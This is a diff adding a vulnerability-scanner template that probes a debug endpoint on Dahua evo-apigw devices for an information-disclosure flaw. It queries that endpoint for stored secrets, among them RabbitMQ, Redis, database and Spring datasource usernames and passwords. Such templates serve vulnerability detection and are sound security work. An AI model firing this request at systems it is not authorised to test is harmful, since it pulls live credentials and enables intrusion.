@@ -1,0 +1,24 @@
+name: dahua-infoleak-evo-apigw
+sets:
+  query:
+    - "service.rabbitmq.username"
+    - "service.rabbitmq.password"
+    - "service.redis.password"
+    - "config.service.db.ip"
+    - "config.service.db.port"
+    - "config.service.db.account.name"
+    - "config.service.db.account.pwd"
+    - "config.service.db.database"
+    - "spring.datasource.default.url"
+    - "spring.datasource.default.username"
+    - "spring.datasource.default.password"
+rules:
+  - method: GET
+    path: "/evo-apigw/evo-cascade/debug/context/env?query={{query}}"
+    expression: |
+      response.status == 200 && response.body.bcontains(b"env")
+detail:
+  author: lxy
+  links:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book
+  description: "大华 evo-apigw 信息泄露漏洞"
